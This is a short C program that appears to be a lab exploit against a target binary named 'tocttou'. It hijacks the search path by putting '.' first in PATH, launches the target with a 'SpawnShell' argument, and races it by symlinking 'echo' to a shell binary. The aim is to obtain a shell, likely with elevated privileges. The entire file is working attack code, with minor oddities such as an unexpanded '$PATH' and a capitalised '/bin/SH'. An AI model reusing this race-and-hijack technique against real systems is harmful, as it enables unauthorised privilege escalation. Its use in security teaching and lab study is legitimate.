#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdlib.h>

int main(int argc, char * argv[])
{   
    setenv("PATH",".:$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin", 1);
     //putenv("PATH=.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/snap/bin");

    pid_t pid = fork();
    if (pid == 0)
    {
        char * argv[] = { "./tocttou", "SpawnShell", NULL};
        execv(argv[0], argv); 
    }

    sleep(1);
    symlink("/bin/SH","echo");
    symlink("/bin/SH", "./bin/echo");

    int status;
    wait(&status);
    unlink("echo");
    unlink("./bin/echo");

}